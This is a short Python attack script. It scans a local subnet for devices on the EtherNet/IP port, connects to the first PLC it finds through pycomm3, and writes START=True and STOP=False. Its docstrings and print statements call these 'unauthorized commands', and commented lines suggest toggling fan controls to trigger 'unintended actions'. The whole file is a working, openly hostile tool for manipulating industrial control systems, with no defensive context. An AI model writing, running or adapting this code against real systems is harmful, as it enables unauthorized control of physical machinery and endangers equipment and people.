from pycomm3 import LogixDriver
import socket
import time

def discover_plc_ip():
    """Attempt to discover the PLC's IP address on the network."""
    # This is a simple example and may need to be adapted based on your network setup
    # You can use ARP scanning or other methods for a more robust discovery
    ip_range = "192.168.1."
    for i in range(1, 255):
        ip = ip_range + str(i)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(0.1)
                s.connect((ip, 44818))  # EtherNet/IP port
                print(f"Discovered PLC at IP: {ip}")
                return ip
        except:
            continue
    print("PLC IP address not found.")
    return None

def send_unauthorized_command(plc_ip):
    """Send unauthorized commands to the PLC to manipulate the START and STOP variables."""
    try:
        with LogixDriver(plc_ip) as plc:
            # Read current values of START and STOP
            start_value = plc.read('START')
            stop_value = plc.read('STOP')
            print(f"Current values - START: {start_value}, STOP: {stop_value}")

            # Send unauthorized commands to toggle START and STOP
            plc.write(('START', True))
            plc.write(('STOP', False))
            print("Sent unauthorized command: START = TRUE, STOP = FALSE")

            # Verify the changes
            start_value = plc.read('START')
            stop_value = plc.read('STOP')
            print(f"Updated values - START: {start_value}, STOP: {stop_value}")

            # Optionally, manipulate other variables or trigger unintended actions
            # plc.write(('Activate_FanA', True))
            # plc.write(('FanA_Off', True))

    except Exception as e:
        print(f"Error communicating with PLC: {e}")

if __name__ == "__main__":
    # If the PLC's IP address is unknown, attempt to discover it
    plc_ip = discover_plc_ip()
    
    if plc_ip:
        # Send unauthorized commands to the PLC
        send_unauthorized_command(plc_ip)
    else:
        print("Unable to proceed without the PLC's IP address.")